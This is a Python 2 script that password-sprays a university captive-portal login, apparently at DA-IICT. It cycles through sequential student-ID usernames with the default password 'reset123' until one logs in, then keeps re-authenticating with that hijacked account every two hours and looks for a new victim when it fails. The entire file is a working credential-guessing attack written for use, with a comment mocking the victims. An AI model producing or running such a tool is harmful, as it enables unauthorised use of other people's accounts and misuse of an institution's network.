#!/usr/bin/env python2
# Author: Sagar

import urllib
import time

beginUN = 200901000
username = beginUN
password = 'reset123'

#relogin time period in minutes
tm = 120


def findNew():
    print 'Finding the dumbass..'
    username = beginUN
    while True:
        try:
            username = username + 1
            if ( username%1000 >= 250 ):
                if(not (username>=201201250)):
                    username = username + 100000
                else:
                    print 'Cant Find!!!.'
                    break
            else :
                f = urllib.urlopen('http://10.100.56.55:8090/httpclient.html','mode=191&username='+str(username)+'&password='+password)
                s = f.read()
                f.close()
                s=s.split('message')[1][1:-2]

                if (s == 'You have successfully logged in'):
                    print 'Found!!'
                    print str(username) +',',str(password) +': ' , time.strftime('--%Y-%m-%d %I:%M %p--'), s+'.'
                    return username
        except IOError, error:
            print time.strftime('--%Y-%m-%d %I:%M %p--'), str(error)
            time.sleep(5)

while True:
	while True:
		try:
			f = urllib.urlopen('http://10.100.56.55:8090/httpclient.html','mode=191&username='+str(username)+'@da-iict.org&password='+password+'&btnSubmit=Login')
			s = f.read()
			f.close()
			s=s.split('message')[1][1:-2]

			if (s != 'You have successfully logged in'):
				username=findNew()
			else:
				print str(username) +',',str(password) +': ' , time.strftime('--%Y-%m-%d %I:%M %p--'), s+'.'

			time.sleep (tm*60)
		except IOError, error:
			print time.strftime('--%Y-%m-%d %I:%M %p--'), str(error)
			time.sleep (5)



